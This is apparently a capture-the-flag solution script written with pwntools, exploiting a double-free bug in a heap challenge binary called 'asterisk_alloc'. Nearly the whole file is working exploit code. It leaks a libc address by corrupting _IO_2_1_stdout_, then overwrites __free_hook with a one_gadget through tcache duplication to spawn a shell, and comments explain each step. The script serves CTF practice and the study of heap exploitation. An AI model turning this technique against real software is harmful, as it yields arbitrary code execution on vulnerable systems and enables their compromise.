from pwn import *



r = process("./asterisk_alloc", env={"LD_PRELOAD": "./libc.so.6"})

libc = ELF("libc.so.6")
def malloc(n, s):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Size: ', str(n))
    r.sendafter('Data: ', s)

def calloc(n, s):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('Size: ', str(n))
    r.sendafter('Data: ', s)

def realloc(n, s):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('Size: ', str(n))
    if n != -1:
        r.sendafter('Data: ', s)

def free(c):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('Which: ', c)

'''
This has the double free vulnerability
since it does not provide any show functions, we have to
cverwrite the _IO_2_1_stdout_ structure for the libc address
leak
'''



# Allocate a chunk of size 0x28  ---> 0x31
realloc(0x28, 'A')


# Since double free vulnerability exists here, taking advantage of
# it, we free the saeme chunk allocated previosuly
free('r')
free('r')

# fail realloc to reset ptr to NULL
# overwrite next ptr onto fake chunk, since the next chunk will start
# from the 0x55...98 address, we go by it

realloc(-1, '')
realloc(0x28, '\x98')

# malloc size > tcache max size to get libc address
# This is to put this chunk into the unsorted bin such that
# fd and bk populated to the main_arena address, doing so
# we will overwrite the 2 Least Significant Bytes such that
# for they point to the _IO_2_1_stdout_, being in the free
# list, we get it later

realloc(-1, '')   # Reset the r.ptr 
realloc(1400, 'A')  # Small bin size since > 0x410 (MAX_TCACHE_SIZE)

# Calls calloc, the reason is, if called after the _IO_write_base, we will get the 
# error "malloc(): memory corruption" , so we do it in advance

calloc(0x200, 'A')


# Free the r.ptr this will make the small bin size chunk to go the unsorted bin first
# and then we set the r.ptr to NULL
free('r')       
realloc(-1, '')

# We create a fake chunk, doing so, we are overwriting the LSB of the populated
# fd to the address of _IO_2_1_stdout_

realloc(0x100, b'\x30'.ljust(8, b'\0') + b'\x60\xe7') # guess stdout offset ?760
realloc(-1, '')  # Resets the r.ptr 
'''
gef➤  x/40xg 0x555555757290 - 0x8
0x555555757288:	0x0000000000000111	0x0000000000000030
0x555555757298:	0x00007ffff7dce760	0x0000555555757280
'''

# Allocate a chunk of size 0x28, since the fake chunk will give us that address
pause()
realloc(0x28, 'A') 
realloc(-1, '')  # Resets the r.ptr

# instead of using realloc, use malloc here to avoid realloc's *Little security check*
# __builtin_expect ((uintptr_t) oldp > (uintptr_t) -oldsize, 0)
# the code snippet below will fail the check
# realloc(0x28, 'A')
# realloc(-1, '') <-- fail here
malloc(0x28, 'A')
payload = p64(0xfbad1800)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += b"\x20"

# Overwrite the _IO_write_base and get the address keak
realloc(0x28, payload)

libc.address = u64(r.recv(6).ljust(8, b"\x00")) - 0x3eb780
print(hex(libc.address))
realloc(-1, "")  # Resets the r.ptr


'''
Double free the calloc'd chunk such that we can perform the tcache dup
Doing so, we first overwrite the fd of the same free'd chunk with the
__free_hook and then resets the r.ptr then again, realloc the chunk t get 
the original chunk, reset the pointer again,

Finally, overwrite the __free_hook with the one_gadget
'''
free('c')
free('c')

realloc(0x200, p64(libc.sym['__free_hook']))
realloc(-1, "")
realloc(0x200, "AA")
realloc(-1, "")
realloc(0x200, p64(libc.address + 0x4f322))


# Trigger the one_gadget
free('c')

r.interactive()